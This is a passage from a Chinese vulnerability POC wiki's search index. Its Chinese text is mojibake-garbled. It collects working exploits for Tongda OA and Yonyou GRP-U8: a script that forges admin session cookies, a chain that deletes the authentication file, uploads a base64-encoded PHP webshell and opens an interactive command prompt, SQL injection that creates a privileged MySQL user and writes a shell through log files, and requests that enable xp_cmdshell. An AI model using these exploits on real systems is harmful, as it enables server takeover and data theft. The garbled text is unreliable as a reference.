MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; QQBrowser/7.0.3698.400)\", \"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 732; .NET4.0C; .NET4.0E)\", \"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; SV1; QQDownload 732; .NET4.0C; .NET4.0E; 360SE)\", \"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 732; .NET4.0C; .NET4.0E)\", \"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)\", \"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1\", \"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1\", \"Mozilla/5.0 (iPad; U; CPU OS 4_2_1 like Mac OS X; zh-cn) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8C148 Safari/6533.18.5\", \"Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0b13pre) Gecko/20110307 Firefox/4.0b13pre\", \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:16.0) Gecko/20100101 Firefox/16.0\", \"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11\", \"Mozilla/5.0 (X11; U; Linux x86_64; zh-CN; rv:1.9.2.10) Gecko/20100922 Ubuntu/10.10 (maverick) Firefox/3.6.10\" ] headers={} def getV11Session(url): checkUrl = url+'/general/login_code.php' try: headers[\"User-Agent\"] = choice(USER_AGENTS) res = requests.get(checkUrl,headers=headers) resText = str(res.text).split('{') codeUid = resText[-1].replace('}\"}', '').replace('\\r\\n', '') getSessUrl = url+'/logincheck_code.php' res = requests.post( getSessUrl, data={'CODEUID': '{'+codeUid+'}', 'UID': int(1)},headers=headers) tmp_cookie = res.headers['Set-Cookie'] headers[\"User-Agent\"] = choice(USER_AGENTS) headers[\"Cookie\"] = tmp_cookie check_available = requests.get(url + '/general/index.php',headers=headers) if 'ç”¨æˆ·æœªç™»å½•' not in check_available.text: if 'é‡æ–°ç™»å½•' not in check_available.text: print('[+]Get Available COOKIE:' + tmp_cookie) else: print('[-]Something Wrong With ' + url + ',Maybe Not Vulnerable.') except: print('[-]Something Wrong With '+url) def get2017Session(url): checkUrl = url+'/ispirit/login_code.php' try: headers[\"User-Agent\"] = choice(USER_AGENTS) res = requests.get(checkUrl,headers=headers) resText = json.loads(res.text) codeUid = resText['codeuid'] codeScanUrl = url+'/general/login_code_scan.php' res = requests.post(codeScanUrl, data={'codeuid': codeUid, 'uid': int( 1), 'source': 'pc', 'type': 'confirm', 'username': 'admin'},headers=headers) resText = json.loads(res.text) status = resText['status'] if status == str(1): getCodeUidUrl = url+'/ispirit/login_code_check.php?codeuid='+codeUid res = requests.get(getCodeUidUrl) tmp_cookie = res.headers['Set-Cookie'] headers[\"User-Agent\"] = choice(USER_AGENTS) headers[\"Cookie\"] = tmp_cookie check_available = requests.get(url + '/general/index.php',headers=headers) if 'ç”¨æˆ·æœªç™»å½•' not in check_available.text: if 'é‡æ–°ç™»å½•' not in check_available.text: print('[+]Get Available COOKIE:' + tmp_cookie) else: print('[-]Something Wrong With ' + url + ',Maybe Not Vulnerable.') else: print('[-]Something Wrong With '+url + ' Maybe Not Vulnerable ?') except: print('[-]Something Wrong With '+url) if __name__ == \"__main__\": parser = argparse.ArgumentParser() parser.add_argument( \"-v\", \"--tdoaversion\", type=int, choices=[11, 2017], help=\"Target TongDa OA Version. e.g: -v 11ã€-v 2017\") parser.add_argument( \"-url\", \"--targeturl\", type=str, help=\"Target URL. e.g: -url 192.168.2.1ã€-url http://192.168.2.1\" ) args = parser.parse_args() url = args.targeturl if 'http://' not in url: url = 'http://' + url if args.tdoaversion == 11: getV11Session(url) elif args.tdoaversion == 2017: get2017Session(url) else: parser.print_help() WgpSec POCæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-01-22 09:08:20 "},"PeiQi_Wiki/OAäº§å“æ¼æ´/é€šè¾¾OA/é€šè¾¾OA v11.6 ä»»æ„æ–‡ä»¶åˆ é™¤&RCE.html":{"url":"PeiQi_Wiki/OAäº§å“æ¼æ´/é€šè¾¾OA/é€šè¾¾OA v11.6 ä»»æ„æ–‡ä»¶åˆ é™¤&RCE.html","title":"é€šè¾¾OA v11.6 ä»»æ„æ–‡ä»¶åˆ é™¤&RCE","keywords":"","body":"é€šè¾¾OA v11.6 ä»»æ„æ–‡ä»¶åˆ é™¤&RCE æ¼æ´æè¿° é€šè¿‡ä»»æ„æ–‡ä»¶æ¼æ´åˆ é™¤ä¸Šä¼ ç‚¹åŒ…å«çš„èº«ä»½éªŒè¯æ–‡ä»¶ï¼Œä»è€Œé€ æˆæœªæˆæƒè®¿é—®å®ç°ä»»æ„æ–‡ä»¶ä¸Šä¼  æ¼æ´å½±å“ [!NOTE] é€šè¾¾OA v11.6 ç¯å¢ƒæ­å»º é€šè¾¾OA v11.6ä¸‹è½½é“¾æ¥ ä¸‹è½½å®Œæ¯•ç‚¹å‡»å®‰è£…å³å¯ æ¼æ´å¤ç° ä½¿ç”¨è§£å¯†å·¥å…· SeayDzend(zendè§£å¯†å·¥å…·) å¯¹é€šè¾¾OAçš„åŠ å¯†ä»£ç è¿›è¡Œè§£å¯† [!NOTE] è§£å¯†å·¥å…·å·²ç»æ”¾åœ¨ç›®å½•ä¸‹çš„POCç›®å½•ä¸­ è§£å¯†å®ŒæˆåæŸ¥çœ‹ webroot\\general\\data_center\\utils\\upload.php æ–‡ä»¶ \\r\\n\\r\\n\"; ?> åœ¨ç¬¬ä¸€è¡ŒåŒ…å«äº†æ–‡ä»¶ auth.inc.php include_once \"inc/auth.inc.php\"; å¯ä»¥çœ‹åˆ°è¿™ä¸ªæ–‡ä»¶ç”¨äºæ£€éªŒæ˜¯å¦ç™»å½•ï¼Œæœªç™»å½•çš„æƒ…å†µæ— æ³•åˆ©ç”¨è¿™ä¸ªæ¼æ´ æŸ¥çœ‹ \\webroot\\module\\appbuilder\\assets\\print.phpæ–‡ä»¶ è¿™é‡Œå¯ä»¥çœ‹åˆ° é¡µé¢è·å– guidå‚æ•°çš„å€¼ ä½¿ç”¨file_existså‡½æ•°åˆ¤æ–­æ–‡ä»¶æ˜¯å¦å­˜åœ¨ å¹¶æœªè¿›è¡Œæ ¡éªŒ å°±æ‰§è¡Œunlinkåˆ é™¤æ–‡ä»¶ å¯ä»¥æœ¬åœ°åœ¨ \\webroot\\inc ç›®å½•åˆ›å»º 1.txt æ–‡ä»¶ ç„¶åè®¿é—® http://xxx.xxx.xxx.xxx/module/appbuilder/assets/print.php?guid=../../../webroot/inc/1.txt å°±ä¼šåˆ é™¤è¿™ä¸ª 1.txt æ–‡ä»¶ï¼Œä¹Ÿä»£è¡¨å¯ä»¥åˆ é™¤ auth.inc.php ç™»å½•æ£€éªŒæ–‡ä»¶ å›åˆ° upload.php æ–‡ä»¶è¿›è¡Œä»£ç å®¡è®¡ åˆ¤æ–­å˜é‡ $action æ˜¯å¦ä¸º uploadï¼Œå†åˆ¤æ–­æ–‡ä»¶ç±»å‹ï¼Œå¦‚æœä¸ä¸º xls å’Œ img åˆ™è¿›å…¥elseåˆ†æ”¯ else { $uploaddir = MYOA_ATTACH_PATH . \"/data_center/attachment/\"; if (!is_dir(MYOA_ATTACH_PATH . \"/data_center/attachment\")) { if (!is_dir(MYOA_ATTACH_PATH . \"/data_center\")) { mkdir(MYOA_ATTACH_PATH . \"/data_center\"); } mkdir(MYOA_ATTACH_PATH . \"/data_center/attachment\"); } if (isset($from_rep)) { if (($from_rep != \"\") && ($from_rep[0] == \"{\")) { $repkid = GetRepKIDBySendId($from_rep); if ($repkid != $to_rep) { if (file_exists($uploaddir . \"/\" . $repkid . \"_\" . $filename)) { copy($uploaddir . \"/\" . $repkid . \"_\" . $filename, $uploaddir . \"/\" . $to_rep . \"_\" . $filename); } } } else { $arr = explode(\",\", $from_rep); for ($i = 0; $i åœ¨è¿™æ®µä»£ç ä¸­ï¼Œå¦‚æœä¸å­˜åœ¨ $from_rep å˜é‡åˆ™ä¼šè·³åˆ°å¦‚ä¸‹ä»£ç  else { $s_n = $_FILES[\"FILE1\"][\"name\"]; if ($s_n[0] != \"{\") { $s_n = $repkid . \"_\" . $s_n; } if (move_uploaded_file($_FILES[\"FILE1\"][\"tmp_name\"], $uploaddir . $s_n)) { } } è¿™é‡Œç›´æ¥å°† $repkid å˜é‡è¿›è¡Œæ‹¼æ¥,ä¹Ÿå°±æ˜¯è¯´å¯ä»¥é€šè¿‡ç›®å½•ç©¿è¶Šæ¥ä¸Šä¼ æ¶æ„æ–‡ä»¶åˆ°æŒ‡å®šç›®å½• [!NOTE] è¿™é‡Œéœ€è¦åˆ©ç”¨file_existså‡½æ•°çš„æ¼æ´æ„é€ /.<>./.<>./.<>./ é€ƒé€¸å‡ºæ¥ ä½¿ç”¨POCæ¥åˆ©ç”¨æ¼æ´ [!NOTE] æ³¨æ„åœ¨åˆ é™¤éªŒè¯èº«ä»½çš„æ–‡ä»¶åï¼Œä¼šé€ æˆåå°é¡µé¢å‡ºç°å¦‚ä¸‹å›¾ï¼Œä½¿ç”¨å‰å¤‡ä»½æ–‡ä»¶ æ¼æ´åˆ©ç”¨POC #!/usr/bin/python3 #-*- coding:utf-8 -*- # author : PeiQi # from : http://wiki.peiqi.tech import requests import re import base64 import sys def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mVersion: é€šè¾¾OA v11.6 ä»»æ„æ–‡ä»¶åˆ é™¤&RCE \\033[0m') print('+ \\033[36mä½¿ç”¨æ ¼å¼: python3 poc.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx \\033[0m') print('+ \\033[36mCmd >>> whoami \\033[0m') print('+------------------------------------------') def POC_1(target_url): check_url = target_url + \"/module/appbuilder/assets/print.php\" try: check_url_response = requests.get(url = check_url) if check_url_response.status_code == 200: print(\"\\033[32m[o] å­˜åœ¨ /module/appbuilder/assets/print.php å¯èƒ½å«æœ‰é€šè¾¾OA v11.6 ä»»æ„æ–‡ä»¶åˆ é™¤&RCEæ¼æ´\\033[0m\") input(\"\\033[32m[o] æ­¤æ¼æ´ä¼šå¯¹çœŸå®ç¯å¢ƒé€ æˆå½±å“ï¼Œè¯·åœ¨æˆæƒçš„æƒ…å†µä¸‹åˆ©ç”¨æ­¤æ¼æ´ï¼ŒæŒ‰ä¸‹ä»»æ„é”®ç»§ç»­..... \\033[0m\") else: print(\"\\033[31m[x] ä¸å­˜åœ¨ /module/appbuilder/assets/print.php æ¼æ´åˆ©ç”¨å¤±è´¥ \\033[0m\") sys.exit(0) except Exception as e: print(\"\\033[31m[x] è¯·æ±‚å¤±è´¥ï¼Œ{} \\033[0m\".format(e)) sys.exit(0) def POC_2(target_url): unlink_url = target_url + \"/module/appbuilder/assets/print.php?guid=../../../webroot/inc/auth.inc.php\" try: unlink_response = requests.get(url = unlink_url) if unlink_response.status_code == 200: print(\"\\033[32m[o] æˆåŠŸåˆ é™¤æ ¡éªŒæ–‡ä»¶ auth.inc.php \\033[0m\") else: print(\"\\033[31m[x] åˆ é™¤æ ¡éªŒæ–‡ä»¶ auth.inc.php å¤±è´¥ \\033[0m\") sys.exit(0) except Exception as e: print(\"\\033[31m[x] è¯·æ±‚å¤±è´¥ï¼Œ{} \\033[0m\".format(e)) sys.exit(0) def POC_3(target_url, payload_php): \"\"\" (ç»•è¿‡çš„webshell) exec(\"cmd /c \".$command); $stdout = $exec->StdOut(); $stroutput = $stdout->ReadAll(); echo $stroutput; ?> \"\"\" vuln_url = target_url + \"/general/data_center/utils/upload.php?action=upload&filetype=peiqi&repkid=/.<>./.<>./.<>./\" files = {'FILE1': ('peiqi.php', payload_php)} try: vuln_response = requests.post(url = vuln_url,files=files) if vuln_response.status_code == 200: print(\"\\033[32m[o] æˆåŠŸå†™å…¥webshellæ–‡ä»¶: _peiqi.php \\033[0m\") print(\"\\033[32m[o] webshellåœ°å€ä¸º: {}/_peiqi.php \\033[0m\".format(target_url)) else: print(\"\\033[31m[x] å†™å…¥webshellæ–‡ä»¶å¤±è´¥ \\033[0m\") sys.exit(0) except Exception as e: print(\"\\033[31m[x] è¯·æ±‚å¤±è´¥ï¼Œ{} \\033[0m\".format(e)) sys.exit(0) def POC_4(target_url, cmd): cmd_url = target_url + \"/_peiqi.php?peiqi={}\".format(cmd) try: cmd_response = requests.get(url = cmd_url) if cmd_response.status_code == 200: print(\"\\033[32m[o] æ­£åœ¨æ‰§è¡Œå‘½ä»¤: {} \\033[0m\".format(cmd_url)) print(\"\\033[32m[o] å“åº”ä¸º: \\n{} \\033[0m\".format(cmd_response.text)) else: print(\"\\033[31m[x] å‘½ä»¤æ‰§è¡Œå¤±è´¥ \\033[0m\") sys.exit(0) except Exception as e: print(\"\\033[31m[x] è¯·æ±‚å¤±è´¥ï¼Œ{} \\033[0m\".format(e)) sys.exit(0) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) POC_1(target_url) POC_2(target_url) payload_php = base64.b64decode(\"PD9waHAKICAgICRjb21tYW5kPSRfR0VUWydwZWlxaSddOwogICAgJHdzaCA9IG5ldyBDT00oJ1dTY3JpcHQuc2hlbGwnKTsKICAgICRleGVjID0gJHdzaC0+ZXhlYygiY21kIC9jICIuJGNvbW1hbmQpOwogICAgJHN0ZG91dCA9ICRleGVjLT5TdGRPdXQoKTsKICAgICRzdHJvdXRwdXQgPSAkc3Rkb3V0LT5SZWFkQWxsKCk7CiAgICBlY2hvICRzdHJvdXRwdXQ7Cj8+\").decode(\"utf-8\") POC_3(target_url, payload_php) while True: cmd = input(\"\\033[35mCmd >>> \\033[0m\") if cmd == \"exit\": sys.exit(0) else: POC_4(target_url, cmd) WgpSec POCæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-01-22 09:08:20 "},"PeiQi_Wiki/OAäº§å“æ¼æ´/é€šè¾¾OA/é€šè¾¾OA v11.7åå°SQLæ³¨å…¥.html":{"url":"PeiQi_Wiki/OAäº§å“æ¼æ´/é€šè¾¾OA/é€šè¾¾OA v11.7åå°SQLæ³¨å…¥.html","title":"é€šè¾¾OA v11.7åå°SQLæ³¨å…¥","keywords":"","body":"é€šè¾¾OA v11.7åå°SQLæ³¨å…¥ æ¼æ´æè¿° é€šè¾¾OA v11.7åå°å­˜åœ¨SQLæ³¨å…¥ï¼Œå¯é€šè¿‡æ­¤æ¼æ´å†™å…¥æ¶æ„åé—¨æ–‡ä»¶æ”»å‡»ç›®æ ‡æœåŠ¡å™¨ æ¼æ´å½±å“ [!NOTE] é€šè¾¾OA v11.7 ç¯å¢ƒæ­å»º ç¯å¢ƒåœ°å€ æ¼æ´å¤ç° åœ¨ general/hr/manage/query/delete_cascade.php æ–‡ä»¶ä¸­ é¦–å…ˆåˆ¤æ–­$condition_cascadeæ˜¯å¦ä¸ºç©ºï¼Œå¦‚æœä¸ä¸ºç©ºï¼Œåˆ™å°†å…¶ä¸­çš„\\'æ›¿æ¢ä¸º'ã€‚ä¸ºä»€ä¹ˆè¦è¿™æ ·æ›¿æ¢å‘¢ï¼Œä¸»è¦æ˜¯å› ä¸ºV11.7ç‰ˆæœ¬ä¸­ï¼Œæ³¨å†Œå˜é‡æ—¶è€ƒè™‘äº†å®‰å…¨é—®é¢˜ï¼Œå°†ç”¨æˆ·è¾“å…¥çš„å­—ç¬¦ç”¨addslasheså‡½æ•°è¿›è¡Œä¿æŠ¤ï¼Œå¦‚ä¸‹ï¼š inc/common.inc.php ä»£ç  ä½¿ç”¨ç›²æ³¨å¯¹SQLæ³¨å…¥è¿›è¡Œæµ‹è¯• è§¦å‘äº†é€šè¾¾OAçš„SQLæ³¨å…¥æ‹¦æˆª inc/conn.phpæ–‡ä»¶ä¸­æ‰¾åˆ°è¿‡æ»¤æœºåˆ¶å¦‚ä¸‹: å…¶è¿‡æ»¤äº†ä¸€äº›å­—ç¬¦ï¼Œä½†æ˜¯å¹¶éæ— æ³•ç»•è¿‡ï¼Œç›²æ³¨çš„æ ¸å¿ƒæ˜¯ï¼šsubstrã€ifç­‰å‡½æ•°ï¼Œå‡æœªè¢«è¿‡æ»¤ï¼Œé‚£ä¹ˆåªè¦æ„é€ MySQLæŠ¥é”™å³å¯é…åˆifå‡½æ•°è¿›è¡Œç›²æ³¨äº†ï¼Œç¿»çœ‹å±€å¤–äººå¸ˆå‚…åœ¨è¡¥å¤©ç™½å¸½å¤§ä¼šä¸Šçš„åˆ†äº«ï¼Œå‘ç°power(9999,99)ä¹Ÿå¯ä»¥ä½¿æ•°æ®åº“æŠ¥é”™ï¼Œæ‰€ä»¥æ„é€ è¯­å¥ï¼š select if((substr(user(),1,1)='r'),1,power(9999,99)) # å½“å­—ç¬¦ç›¸ç­‰æ—¶ï¼Œä¸æŠ¥é”™ï¼Œé”™è¯¯æ—¶æŠ¥é”™ æ·»åŠ SQLæ•°æ®åº“ç”¨æˆ· grant all privileges ON mysql.* TO 'peiqi'@'%' IDENTIFIED BY 'peiqiABC@123' WITH GRANT OPTION è®¿é—® http://xxx.xxx.xxx.xxx/general/hr/manage/query/delete_cascade.php?condition_cascade=grant all privileges ON mysql.* TO 'peiqi'@'%' IDENTIFIED BY 'peiqiABC@123' WITH GRANT OPTION è¿›å…¥ Myoa/mysql5/bin ç›®å½• æ‰§è¡Œ mysql -upeiqi -p è¾“å…¥å¯†ç æŸ¥è¯¢æ‰€æœ‰ç”¨æˆ· å‘ç°æˆåŠŸæ‰§è¡Œæ·»åŠ ä¸€ä¸ªè´¦æˆ· ç„¶åè¯¥ç”¨æˆ·æ˜¯å¯¹mysqlæ•°æ®åº“æ‹¥æœ‰æ‰€æœ‰æƒé™çš„,ç„¶åç»™è‡ªå·±åŠ æƒé™ï¼š UPDATE `mysql`.`user` SET `Password` = '*FBCFBB73CF21D4F464A95E775B40AF27A679CD2D', `Select_priv` = 'Y', `Insert_priv` = 'Y', `Update_priv` = 'Y', `Delete_priv` = 'Y', `Create_priv` = 'Y', `Drop_priv` = 'Y', `Reload_priv` = 'Y', `Shutdown_priv` = 'Y', `Process_priv` = 'Y', `File_priv` = 'Y', `Grant_priv` = 'Y', `References_priv` = 'Y', `Index_priv` = 'Y', `Alter_priv` = 'Y', `Show_db_priv` = 'Y', `Super_priv` = 'Y', `Create_tmp_table_priv` = 'Y', `Lock_tables_priv` = 'Y', `Execute_priv` = 'Y', `Repl_slave_priv` = 'Y', `Repl_client_priv` = 'Y', `Create_view_priv` = 'Y', `Show_view_priv` = 'Y', `Create_routine_priv` = 'Y', `Alter_routine_priv` = 'Y', `Create_user_priv` = 'Y', `Event_priv` = 'Y', `Trigger_priv` = 'Y', `Create_tablespace_priv` = 'Y', `ssl_type` = '', `ssl_cipher` = '', `x509_issuer` = '', `x509_subject` = '', `max_questions` = 0, `max_updates` = 0, `max_connections` = 0, `max_user_connections` = 0, `plugin` = 'mysql_native_password', `authentication_string` = '', `password_expired` = 'Y' WHERE `Host` = Cast('%' AS Binary(1)) AND `User` = Cast('peiqi' AS Binary(5)); ç„¶åç”¨æ³¨å…¥ç‚¹åˆ·æ–°æƒé™ï¼Œå› ä¸ºè¯¥ç”¨æˆ·æ˜¯æ²¡æœ‰åˆ·æ–°æƒé™çš„æƒé™çš„ï¼šgeneral/hr/manage/query/delete_cascade.php?condition_cascade=flush privileges;è¿™æ ·å°±æ‹¥æœ‰äº†æ‰€æœ‰æƒé™ ç™»å½•å¦‚æœå¤±è´¥ï¼Œæ‰§è¡Œ grant all privileges ON mysql.* TO 'peiqi'@'%' IDENTIFIED BY 'peiqiABC@123' WITH GRANT OPTION åˆ©ç”¨æ¼æ´å†™shell # æŸ¥è·¯å¾„ï¼š select @@basedir; # F:\\OA\\mysql5\\ï¼Œé‚£ä¹ˆwebç›®å½•å°±æ˜¯ F:/OA/webroot/ # æ–¹æ³•1ï¼š set global slow_query_log=on; set global slow_query_log_file='F:/OA/webroot/'; select '' or sleep(11); # æ–¹æ³•2ï¼š set global general_log = on; set global general_log_file = 'F:/OA/webroot/'; select ''; show variables like '%general%'; ä¸Šä¼ å¤§é©¬ å‚è€ƒæ–‡ç«  é€šè¾¾OA v11.7åå°SQLæ³¨å…¥åˆ°RCE[0day] WgpSec POCæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-01-22 09:08:20 "},"PeiQi_Wiki/OAäº§å“æ¼æ´/ç”¨å‹OA/":{"url":"PeiQi_Wiki/OAäº§å“æ¼æ´/ç”¨å‹OA/","title":"ç”¨å‹OA","keywords":"","body":"ç”¨å‹ ç”¨å‹GRP-U8è¡Œæ”¿äº‹ä¸šè´¢åŠ¡ç®¡ç†è½¯ä»¶ SQLæ³¨å…¥ CNNVD-201610-923 WgpSec POCæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-01-22 09:08:20 "},"PeiQi_Wiki/OAäº§å“æ¼æ´/ç”¨å‹OA/ç”¨å‹GRP-U8è¡Œæ”¿äº‹ä¸šè´¢åŠ¡ç®¡ç†è½¯ä»¶ SQLæ³¨å…¥ CNNVD-201610-923.html":{"url":"PeiQi_Wiki/OAäº§å“æ¼æ´/ç”¨å‹OA/ç”¨å‹GRP-U8è¡Œæ”¿äº‹ä¸šè´¢åŠ¡ç®¡ç†è½¯ä»¶ SQLæ³¨å…¥ CNNVD-201610-923.html","title":"ç”¨å‹GRP-U8è¡Œæ”¿äº‹ä¸šè´¢åŠ¡ç®¡ç†è½¯ä»¶ SQLæ³¨å…¥ CNNVD-201610-923","keywords":"","body":"ç”¨å‹GRP-U8è¡Œæ”¿äº‹ä¸šè´¢åŠ¡ç®¡ç†è½¯ä»¶ SQLæ³¨å…¥ CNNVD-201610-923 æ¼æ´æè¿° ç”¨å‹GRP-u8å­˜åœ¨XXEæ¼æ´ï¼Œè¯¥æ¼æ´æºäºåº”ç”¨ç¨‹åºè§£æXMLè¾“å…¥æ—¶æ²¡æœ‰è¿›åˆ¶å¤–éƒ¨å®ä½“çš„åŠ è½½ï¼Œå¯¼è‡´å¯åŠ è½½å¤–éƒ¨SQLè¯­å¥ï¼Œä»¥åŠå‘½ä»¤æ‰§è¡Œ å½±å“ç‰ˆæœ¬ [!NOTE] ç”¨å‹GRP-U8è¡Œæ”¿äº‹ä¸šå†…æ§ç®¡ç†è½¯ä»¶ï¼ˆæ–°æ”¿åºœä¼šè®¡åˆ¶åº¦ä¸“ç‰ˆï¼‰ FOFA [!NOTE] title=\"ç”¨å‹GRP-U8è¡Œæ”¿äº‹ä¸šå†…æ§ç®¡ç†è½¯ä»¶\" æ¼æ´å¤ç° æ¼æ´åˆ©ç”¨POCè¯·æ±‚åŒ… POST /Proxy HTTP/1.1 Accept: Accept: */* Content-Type: application/x-www-form-urlencoded User-Agent: Mozilla/4.0 (compatible; MSIE 6.0;) Host: host Content-Length: 357 Connection: Keep-Alive Cache-Control: no-cache cVer=9.8.0&dp=XML AS_DataRequest ProviderNameDataSetProviderData Dataselect @@version è¯·æ±‚åæŒ‰F12æŸ¥çœ‹æºä»£ç å¯ä»¥å¾—åˆ°SQLè¯­å¥æŸ¥è¯¢ç»“æœ ä¹Ÿå¯ä»¥è°ƒç”¨ xp_cmdshell æ¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤(å¤§éƒ¨åˆ†æ­¤ç³»ç»Ÿä¸ºwindows) [!NOTE] æ³¨æ„ï¼šå¤§éƒ¨åˆ†é»˜è®¤æ˜¯ä¸å¼€å¯ xp_cmdshell æ¨¡å—çš„ å¯ä»¥ä½¿ç”¨å¦‚ä¸‹æ–¹æ³•æ‰“å¼€xp_cmdshellæ–¹æ³• å°†å¦‚ä¸‹POSTæ•°æ®æŒ‰é¡ºåºå‘é€(æ³¨æ„ master æ”¹ä¸ºå½“å‰æ•°æ®åº“å) cVer=9.8.0&dp=XMLAS_DataRequestProviderNameDataSetProviderDataDatause master cVer=9.8.0&dp=XMLAS_DataRequestProviderNameDataSetProviderDataDataexec sp_configure 'show advanced options',1 cVer=9.8.0&dp=XMLAS_DataRequestProviderNameDataSetProviderDataDatareconfigure cVer=9.8.0&dp=XMLAS_DataRequestProviderNameDataSetProviderDataDataexec sp_configure 'xp_cmdshell',1 cVer=9.8.0&dp=XMLAS_DataRequestProviderNameDataSetProviderDataDatareconfigure [!NOTE] å‘é€å¦‚ä¸Šå®é™…ä¸ºæ‰§è¡ŒSQLè¯­å¥æ‰“å¼€ xp_cmdshell use master; exec sp_configure 'show advanced options',1; reconfigure; exec sp_configure 'xp_cmdshell',1; reconfigure; å†å‘é€ä»¥ä¸‹æ•°æ®å¯æˆåŠŸä½¿ç”¨(ä¹Ÿå¯èƒ½å¤±è´¥) cVer=9.8.0&dp=XMLAS_DataRequestProviderNameDataSetProviderDataDataexec xp_cmdshell \"whoami\" [!NOTE] æ‰§è¡Œè¿‡ç¨‹ä¸­æŠ¥é”™ java.sql.SQLExceptionã€é”™è¯¯ä»£ç : 0; ç›¸å…³ä¿¡æ¯:xxxxxxã€‘ä¸ç”¨ç†ä¼š å‘é€è¯·æ±‚åå†ä½¿ç”¨æ­¤æ¨¡å—åˆ™ä¼šæˆåŠŸè¯·æ±‚æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ æ¼æ´åˆ©ç”¨POC #!/usr/bin/python3 #-*- coding:utf-8 -*- # author : PeiQi # from : http://wiki.peiqi.tech import requests import re import sys def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mVersion: ç”¨å‹GRP-U8è¡Œæ”¿äº‹ä¸šå†…æ§ç®¡ç†è½¯ä»¶ \\033[0m') print('+ \\033[36mä½¿ç”¨æ ¼å¼: python3 CNNVD-201610-923.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx \\033[0m') print('+ \\033[36m(Y/N) >>> Y or N \\033[0m') print('+ \\033[36mcmd >>> ipconfig \\033[0m') print('+------------------------------------------') def POC_1(target_url): check_url = target_url + \"/Proxy\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Content-Type\": \"application/x-www-form-urlencoded\" } data = \"\"\"cVer=9.8.0&dp=XMLAS_DataRequestProviderNameDataSetProviderDataDataselect 1,user,db_name(),host_name(),@@version\"\"\" try: print(\"\\033[32m[o] æ­£åœ¨æ‰§è¡ŒSQLè¯­å¥:select 1,user,db_name(),host_name(),@@version...\\033[0m\") response = requests.post(url=check_url, headers=headers, data=data, timeout=10) row_1 = '> æ•°æ®åº“ç”¨æˆ·ä¸º:{}\\033[0m\".format(db_user)) print(\"\\033[32m >> æ•°æ®åº“åä¸º:{}\\033[0m\".format(db_name)) print(\"\\033[32m >> æ•°æ®åº“ä¸»æœºåä¸º:{}\\033[0m\".format(db_host)) print(\"\\033[32m >> æ•°æ®åº“ç‰ˆæœ¬ä¸º:{}\\033[0m\".format(db_vers)) return db_name else: print(\"\\033[31m[x] æ¼æ´å·²è¢«ä¿®å¤ \\033[0m\") sys.exit(0) except: print(\"\\033[31m[x] è¯·æ±‚å¤±è´¥ \\033[0m\") sys.exit(0) def xp_cmdshell_open(target_url, db_name): open_sql = [\"use {}\".format(db_name),\"exec sp_configure 'show advanced options',1\",\"reconfigure\",\"exec sp_configure 'xp_cmdshell',1\",\"reconfigure\"] num = 1 for sql in open_sql: open_url = target_url + \"/Proxy\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Content-Type\": \"application/x-www-form-urlencoded\" } data = 'cVer=9.8.0&dp=XMLAS_DataRequestProviderNameDataSetProviderDataData{}'.format(sql) try: print(\"\\033[32m[o] æ­£åœ¨æ‰§è¡ŒSQLè¯­å¥:{}...\\033[0m\".format(sql)) response = requests.post(url=open_url, headers=headers, data=data, timeout=10) num = num + 1 if num == 5 : POC_2(target_url, db_name) except: print(\"\\033[31m[x] å¼€å¯ xp_cmdsheall å¤±è´¥ \\033[0m\") sys.exit(0) def POC_2(target_url, db_name): db_name = db_name sql_cmd_url = target_url + \"/Proxy\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Content-Type\": \"application/x-www-form-urlencoded\" } data = \"\"\"cVer=9.8.0&dp=XMLAS_DataRequestProviderNameDataSetProviderDataDataexec xp_cmdshell \"whoami\"\"\"\" try: print(\"\\033[32m[o] æ­£åœ¨æ‰§è¡ŒSQLè¯­å¥:exec xp_cmdshell 'whoami'...\\033[0m\") response = requests.post(url=sql_cmd_url, headers=headers, data=data, timeout=10) if 'exec 